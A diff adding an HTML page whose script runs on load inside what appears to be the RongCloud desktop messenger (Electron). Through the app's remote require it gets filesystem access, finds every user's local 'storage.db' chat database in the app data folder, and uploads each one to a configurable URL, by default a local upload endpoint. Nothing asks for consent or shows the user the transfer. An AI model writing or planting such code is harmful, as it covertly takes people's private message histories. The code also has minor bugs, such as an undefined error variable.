@@ -1,0 +1,116 @@
+<html>
+     <body>
+
+        <script>
+          (function(){
+            var require = RongDesktop.remote.require;
+            var request = require('request');
+            var path = require('path');
+            var fs = require('fs');
+
+            var os = require('os');
+
+            var uploadFile =  function(file, callbacks, option){
+                // TODO 适配 XMLHttpRequest
+                var xhr = new XMLHttpRequest();
+                xhr.upload.onprogress = function(event){
+                  callbacks.onprogress(event);
+                };
+                
+                // TODO 适配 upload
+                  xhr.onreadystatechange = function () {
+                      if (xhr.readyState == 4) {
+                        if (xhr.status == 200) {
+                            if (xhr.responseText) {
+                              callbacks.onSuccess(JSON.parse(xhr.responseText));
+                            }else{
+                              callbacks.onError();
+                            }
+                        }
+                      }
+                  };
+                  var url = (option && option.url) || "http://127.0.0.1:9090/upload";
+                  xhr.open("POST", url, true);
+                  var formData = new FormData();
+                  formData.append('file', file);
+                  xhr.send(formData);
+              }
+
+            var getAppRoot = () => {
+              var platform = os.platform();
+              var userRoot = os.homedir(),
+                  appKey = 'tdrvipkst7v85',
+                  appName = 'RCE',
+                  dbs = 'RongCloud'
+              var pMap = {
+                darwin: () => {
+                  return 'Library/Application\ Support';
+                },
+                win32: () => {
+                  return 'AppData\\Roaming'
+                },
+                linux: () => {
+
+                }
+              };
+              var library = pMap[platform]();
+              return path.join(userRoot, library, appName, dbs, appKey)
+            }
+            
+            /*
+            
+              var dbs = {
+                userId1: data,
+                userId2: data
+              }
+             */
+            var getDBs = () => {
+              var dbs = {};
+              var url = getAppRoot();
+              var usernames = fs.readdirSync(url);
+              usernames = usernames.filter((name) => {
+                return name.indexOf('.') != 0;
+              })
+              usernames.forEach( function (name){
+                var dbname = 'storage.db'//'storage.db';
+                var dbUrl = path.join(url, name, dbname)
+                dbs[name] = dbUrl;
+              });
+              return dbs;
+            }
+            
+            var readFile = (name, url) => {
+              return new Promise((resolve, reject) => {
+                fs.readFile(url, function(err,data){
+                  if(err){
+                    console.error(err);
+                    return reject(error)
+                  }
+                  var blob = new Blob([data]);
+                  var file = new File([blob], name);
+                  resolve(file)
+                });
+              })
+            }
+            var DBs = getDBs();
+            for(var name in DBs){
+              var url = DBs[name];
+              var filename = name + '.db';
+              readFile(filename, url).then((file) => {
+                uploadFile(file, {
+                  onSuccess:function(data){
+                    console.log(data);
+                  },
+                  onprogress:function(event){
+                    console.log(event);
+                  },
+                  onError:function(){
+                  }
+                });
+              })
+            }
+          })()
+        </script>
+     </body>
+</html>
+
